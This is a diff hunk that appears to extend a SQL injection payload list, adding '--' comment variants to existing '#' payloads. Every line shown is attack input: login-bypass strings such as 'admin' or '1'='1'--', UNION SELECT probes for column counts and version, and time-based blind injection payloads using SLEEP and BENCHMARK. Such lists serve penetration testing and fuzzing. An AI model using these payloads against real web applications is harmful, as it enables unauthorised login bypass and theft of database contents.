@@ -9,29 +9,44 @@
 'OR 1=1#
 ' OR '1
 ' OR 1 -- -
+' OR 1 -- #
 ' OR '' = '
 '='
 'LIKE' 
 '=0#+
+'=0--+
 ' OR 'x'='x
 ' AND <Column Name> IS NULL; # 
+' AND <Column name> IS NULL;--
 <key value>' ORDER BY 1#+
+<key value>' ORDER BY 1--+
 ' UNION SELECT sum(columnname ) from tablename #
+' UNION SELECT sum(columnname ) from tablename --
 1 AND (SELECT * FROM Users) = <key value>
 ' OR 1=1#
 ' OR 1=0#
 ' OR x=x#
 ' OR x=y#
+' OR 1=1--
+' OR 1=0--
+' OR x=x--
+' OR x=y--
 <key value>) or sleep(5)#
 <key value>)) or sleep(5)#
+<key value>) or sleep(5)--
+<key value>)) or sleep(5)--
 ' ORDER BY SLEEP(5)
 ' ORDER BY 1,SLEEP(5)
 ' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
 ' ORDER BY 1,SLEEP(5)#
+' ORDER BY 1,SLEEP(5)--
 ' UNION ALL SELECT 1#
+' UNION ALL SELECT 1--
 ' UNION SELECT @@VERSION,SLEEP(5)#
 ' UNION ALL SELECT <total no of columns>#
 ' or true#
 ' or 'x'='x
 ' or 1=1#
 admin' or '1'='1'#
+' or 1=1--
+admin' or '1'='1'--
